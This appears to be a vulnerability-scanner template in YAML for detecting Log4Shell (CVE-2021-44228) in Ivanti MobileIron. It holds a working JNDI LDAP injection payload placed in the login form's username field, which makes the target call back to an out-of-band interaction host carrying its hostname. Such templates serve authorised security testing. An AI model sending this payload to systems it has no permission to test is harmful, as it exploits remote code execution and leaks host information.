id: mobileiron-log4j-rce
brief:
    title: Ivanti MobileIron (Log4j) - Remote Code Execution
    by: meme-lord
    level: critical
    about: Ivanti MobileIron is susceptible to remote code execution via the Apache Log4j2 library.  Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI feature...
    label:
        - jndi
        - log4j
        - rce
        - cve
        - cve2021
        - ivanti
        - oast
        - mobileiron
        - kev
        - vuln
    score: CVE-2021-44228 CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/mifs/j_spring_security_check'
      head:
        Content-Type: application/x-www-form-urlencoded
        Referer: '{{RootURL}}/mifs/user/login.jsp'
      body: j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&j_password=password&logincontext=employee
      signs:
        - "on": word
          has:
            - /mifs/user/login.jsp?error=1
          in: location
          need: all
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
